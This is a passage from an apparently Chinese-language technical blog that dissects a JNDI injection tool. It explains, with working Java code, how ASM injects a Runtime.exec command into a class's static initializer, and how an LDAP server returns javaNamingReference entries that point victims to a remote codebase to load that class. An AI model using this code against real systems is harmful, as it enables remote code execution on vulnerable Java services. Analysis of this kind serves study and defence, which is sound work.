&lt;p>一个抽象类，有很多方法，其中&lt;code>public MethodVisitor visitMethod(xxxx)&lt;/code>方法，是当扫描器扫描到类的方法时调用，各个参数分别为修饰符、方法名、方法签名、泛型信息、抛出的异常&lt;/p>
&lt;p>综上，这段插入命令的代码是创建一个ClassReader读入class文件，创建ClassWriter并经过TransformClass的修饰生成ClassVisitor对象，调用ClassReader的accept方法（传入这个ClassVisitor对象），按顺序执行ClassVisitor中的方法&lt;/p>
&lt;p>这个TransformClass是自行实现的&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TransformClass&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">ClassVisitor&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TransformClass&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ClassVisitor&lt;/span> &lt;span style="color:#111">classVisitor&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ASM7&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">classVisitor&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">MethodVisitor&lt;/span> &lt;span style="color:#75af00">visitMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">access&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">descriptor&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">signature&lt;/span>&lt;span style="color:#f92672">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">exceptions&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MethodVisitor&lt;/span> &lt;span style="color:#111">mv&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">cv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">access&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">descriptor&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">signature&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">exceptions&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">equals&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;clinit&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#f92672">)){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">TransformMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>它作为ClassVisitor的实现类，覆写了visitMethod方法，最后return的对象是TransformedMethod&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TransformMethod&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">MethodVisitor&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">TransformMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">MethodVisitor&lt;/span> &lt;span style="color:#111">methodVisitor&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">super&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ASM7&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">methodVisitor&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">command&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">visitCode&lt;/span>&lt;span style="color:#f92672">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Label&lt;/span> &lt;span style="color:#111">label0&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Label&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Label&lt;/span> &lt;span style="color:#111">label1&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Label&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Label&lt;/span> &lt;span style="color:#111">label2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Label&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitTryCatchBlock&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">label0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">label1&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">label2&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;java/lang/Exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitLabel&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">label0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitLdcInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitVarInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ASTORE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitMethodInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INVOKESTATIC&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;java/lang/Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;getRuntime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;()Ljava/lang/Runtime;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitVarInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ALOAD&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitMethodInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INVOKEVIRTUAL&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;java/lang/Runtime&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;(Ljava/lang/String;)Ljava/lang/Process;&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">POP&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitLabel&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">label1&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Label&lt;/span> &lt;span style="color:#111">label3&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Label&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitJumpInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">GOTO&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">label3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitLabel&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">label2&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitVarInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ASTORE&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitVarInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">ALOAD&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitMethodInsn&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Opcodes&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">INVOKEVIRTUAL&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;java/lang/Exception&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;printStackTrace&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;()V&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">mv&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">visitLabel&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">label3&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>可以看到这个方法是从字节码级别插入Runtime.exec的内容&lt;/p>
&lt;p>综上，最后返回的字节码只要被扫描类方法，就会命令执行；直接下载字节码，会发现实际就是在ExecTemplateJDK7中多了个Runtime.getRuntime().exec()的静态代码块&lt;/p>
&lt;h3 id="ldaprefserver">LDAPRefServer&lt;/h3>
&lt;p>使用InMemoryDirectoryServer启动了一个ldap服务端，额外实现了OperationInterceptor用来拦截ldap通信&lt;/p>
&lt;p>ldap查询结果会传给processSearchResult处理，在sendResult中根据codebase获取的javaFactory 也就是template下的class文件，最后将这些信息写入到了result中&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">@Override&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">processSearchResult&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">InMemoryInterceptedSearchResult&lt;/span> &lt;span style="color:#111">result&lt;/span> &lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">base&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRequest&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">getBaseDN&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Entry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">sendResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e1&lt;/span> &lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">sendResult&lt;/span> &lt;span style="color:#f92672">(&lt;/span> &lt;span style="color:#111">InMemoryInterceptedSearchResult&lt;/span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Entry&lt;/span> &lt;span style="color:#111">e&lt;/span> &lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">LDAPException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">MalformedURLException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">cbstring&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">codebase&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">javaFactory&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Mapper&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">references&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">base&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">javaFactory&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">turl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">cbstring&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">javaFactory&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">concat&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getLocalTime&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; [LDAPSERVER] &amp;gt;&amp;gt; Send LDAP reference result for &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">base&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34; redirecting to &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">turl&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javaClassName&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;foo&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javaCodeBase&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cbstring&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;objectClass&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;javaNamingReference&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//$NON-NLS-1$
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">addAttribute&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javaFactory&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">javaFactory&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">sendSearchEntry&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">result&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">LDAPResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ResultCode&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">SUCCESS&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
